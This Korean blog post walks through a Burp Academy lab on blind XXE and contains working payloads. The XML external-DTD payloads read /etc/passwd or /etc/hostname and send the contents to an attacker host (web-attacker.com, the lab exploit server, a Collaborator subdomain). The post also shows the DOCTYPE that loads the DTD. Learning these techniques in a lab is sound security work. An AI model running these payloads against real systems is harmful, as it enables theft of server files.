---
layout: post
title: "Burp Academy 문제풀이 - Exploiting blind XXE to exfiltrate data using a malicious external DTD"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, XXE]
toc: true
---

# 개요
- Blind XXE 문제인데 XML의 파라메터 엔터티(Parameter Entity)를 통해 out-of-band 통신을 발생시키는 예제로 보인다. 
- 문제 주소: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration


- 블라인드 XXE 설명 주소: https://portswigger.net/web-security/xxe/blind
- 난이도: PRACTITIONER (중간)

# 문제분석
- 이전 문제들과 마찬가지로 "Check stock" 기능을 통해 XML 을 삽입할 수 있다. 
- `/etc/hostname` 파일의 내용을 얻어내면 된다. 
- 내용을 HTTP 응답으로 직접확인할 수는 없다. Blind XXE를 응용해야 한다. 
```
This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, exfiltrate the contents of the /etc/hostname file.

Note
To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator's default public server.
```


# 준비
## exploit server
이 문제부터는 exploit server 가 등장한다. 다음과 같이 특정 경로 요청에 대해 어떤 응답을 보낼지를 설정할 수 있다. 

![exploit server](/images/burp-academy-exploit-servser.png)



# 1차 시도 
우선 Parameter 엔터티로 `/etc/hostname` 을 접근할 수 있는지 확인해본다. 
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<stockCheck>
	<productId>%file;</productId>
	<storeId>1</storeId>
</stockCheck>
```

안된다. XML 파싱에러가 발생했다. 
```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 19

"XML parsing error"
```

## 2차 시도 
XXE 설명 페이지를 보면 다음 페이로드가 소개되어 있다. 

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

- `&#x25;` 는 HTML 디코드하면 `%` 이다. 
- /etc/passwd의 내용을 file 이라는 이름의 파라메터 엔터티에 저장해둔다. 
- eval이라는 이름의 파라메터 엔터티에 다이내믹 선언한 exfiltrate 라는 파라메터 엔터티의 값을 저장해둔다. 
- exfiltrate 엔터티는 HTTP 요청을 공겨자의 웹 서버에 file 엔터티의 내용을 URL 쿼리 스트링으로 함께 보낸다. 

이 것을 다음과 같이 바꿔서 보냈다. 

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://exploit-0ae8003e0426eb73c02fa82501bd002e.exploit-server.net/?x=%file;'>">
%eval;
%exfiltrate;
```

보안 이유 때문에 Entity 는 사용할 수 없다는 응답이 돌아왔다. 
```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 47

"Entities are not allowed for security reasons"
```

## 3차 시도 
여기서 부터는 잘 모르겠다. 정답을 봤다. 

# 해답
이 문제를 풀려면 Burp Collaborator와 통신이 가능한 Burp Suite Professional 버전이 필요하다. 

- STEP 1. Burp Suite Professional에서 Burp Collaborator 탭으로 이동한다. 
- STEP 2. "Copy to clipboard" 를 이용해 유니크한 Burp Collaborator 페이로드를 복사해둔다. 
- STEP 3. 다음 DTD 파일의 BURP-COLLABORATOR-SUBDOMAIN 을 복사한 페이로드로 바꾼다. 

```xml 
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
```

- STEP 4. exploit server 로 이동해서 위의 DTD 파일을 응답 Body 부분에 저장한다. 
- STEP 5. 유저가  "Check stock" 버튼을 눌렀을 때의 POST 요청 바디 부분을 다음과 같이 바꾼다. 

```xml 
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```

- STEP 6. Burp Suite Professional에서 Burp Collaborator 탭에서 "Poll now" 를 클릭한다. 
- STEP 7. 조금 기다리면 Burp Collaborator 서버로 통신한 DNS와 HTTP 통신이력이 보인다. HTTP 통신에 /ect/hostname 파일의 내용이 보인다. 

전체적인 구성도를 그려보면 다음과 같다고 생각된다.

![구성도](/images/burp-academy-xxe-5-diagram.png)